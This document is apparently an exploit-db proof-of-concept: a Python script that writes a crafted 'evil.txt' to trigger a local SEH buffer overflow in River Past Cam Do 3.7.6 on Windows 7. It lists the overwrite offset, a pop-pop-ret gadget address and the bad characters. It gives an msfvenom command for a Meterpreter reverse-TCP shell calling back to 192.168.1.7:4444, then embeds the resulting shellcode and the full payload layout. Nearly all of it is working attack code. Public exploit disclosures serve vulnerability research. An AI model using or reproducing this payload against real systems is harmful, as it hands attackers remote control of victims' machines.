# Exploit Title: River Past Cam Do 3.7.6 - Local Buffer Overflow (SEH) - Windows 7
# Date: 2019-03-01
# Exploit Author: Uday Mittal
# Vendor Homepage: https://river-past-cam-do.en.softonic.com/?ex=DSK-1218.6
# Software Link: https://en.softonic.com/download/river-past-cam-do/windows/post-download?sl=1
# Version : 3.7.6
# Contact: https://twitter.com/yaksas443
# Tested on: Microsoft Windows 7 x86
# original PoC: https://www.exploit-db.com/exploits/46335


# SEH Offset: 284
# 0x10016a66 : pop esi # pop ecx # ret 0x08 | ascii {PAGE_EXECUTE_READ} [rvddshow2.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v7.7.6.1601 (C:\Program Files\River Past\Cam Do\rvddshow2.dll)
# badchars: \x00\x0A\x0D\x2f
# shellcode command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=4444 -b '\x00\x0A\x0D\x2f' -f python -v scode

filename = "evil.txt"

scode =  ""
scode += "\xba\xf6\x7e\xf4\x7d\xd9\xc1\xd9\x74\x24\xf4\x58\x29"
scode += "\xc9\xb1\x56\x31\x50\x13\x83\xc0\x04\x03\x50\xf9\x9c"
scode += "\x01\x81\xed\xe3\xea\x7a\xed\x83\x63\x9f\xdc\x83\x10"
scode += "\xeb\x4e\x34\x52\xb9\x62\xbf\x36\x2a\xf1\xcd\x9e\x5d"
scode += "\xb2\x78\xf9\x50\x43\xd0\x39\xf2\xc7\x2b\x6e\xd4\xf6"
scode += "\xe3\x63\x15\x3f\x19\x89\x47\xe8\x55\x3c\x78\x9d\x20"
scode += "\xfd\xf3\xed\xa5\x85\xe0\xa5\xc4\xa4\xb6\xbe\x9e\x66"
scode += "\x38\x13\xab\x2e\x22\x70\x96\xf9\xd9\x42\x6c\xf8\x0b"
scode += "\x9b\x8d\x57\x72\x14\x7c\xa9\xb2\x92\x9f\xdc\xca\xe1"
scode += "\x22\xe7\x08\x98\xf8\x62\x8b\x3a\x8a\xd5\x77\xbb\x5f"
scode += "\x83\xfc\xb7\x14\xc7\x5b\xdb\xab\x04\xd0\xe7\x20\xab"
scode += "\x37\x6e\x72\x88\x93\x2b\x20\xb1\x82\x91\x87\xce\xd5"
scode += "\x7a\x77\x6b\x9d\x96\x6c\x06\xfc\xfe\x41\x2b\xff\xfe"
scode += "\xcd\x3c\x8c\xcc\x52\x97\x1a\x7c\x1a\x31\xdc\xf5\x0c"
scode += "\xc2\x32\xbd\x5d\x3c\xb3\xbd\x74\xfb\xe7\xed\xee\x2a"
scode += "\x88\x66\xef\xd3\x5d\x12\xe5\x43\x9e\x4a\xf8\x94\x76"
scode += "\x88\xfb\x8b\xda\x05\x1d\xfb\xb2\x45\xb2\xbc\x62\x25"
scode += "\x62\x55\x69\xaa\x5d\x45\x92\x61\xf6\xec\x7d\xdf\xae"
scode += "\x98\xe4\x7a\x24\x38\xe8\x51\x40\x7a\x62\x53\xb4\x35"
scode += "\x83\x16\xa6\x22\xf4\xd8\x36\xb3\x91\xd8\x5c\xb7\x33"
scode += "\x8f\xc8\xb5\x62\xe7\x56\x45\x41\x74\x90\xb9\x14\x4c"
scode += "\xea\x8c\x82\xf0\x84\xf0\x42\xf0\x54\xa7\x08\xf0\x3c"
scode += "\x1f\x69\xa3\x59\x60\xa4\xd0\xf1\xf5\x47\x80\xa6\x5e"
scode += "\x20\x2e\x90\xa9\xef\xd1\xf7\xa9\xe8\x2d\x85\x85\x50"
scode += "\x45\x75\x96\x60\x95\x1f\x16\x31\xfd\xd4\x39\xbe\xcd"
scode += "\x15\x90\x97\x45\x9f\x75\x55\xf4\xa0\x5f\x3b\xa8\xa1"
scode += "\x6c\xe0\x5b\xdb\x1d\x17\x9c\x1c\x34\x7c\x9d\x1c\x38"
scode += "\x82\xa2\xca\x01\xf0\xe5\xce\x35\x0b\x50\x72\x1f\x86"
scode += "\x9a\x20\x5f\x83"

evilString = "A" * 280 + "\xEB\x12\x90\x90" + "\x66\x6a\x01\x10" + "\x90"*100 + scode +  "\x90"*1300

file = open(filename,'w')
file.write(evilString)
file.close()
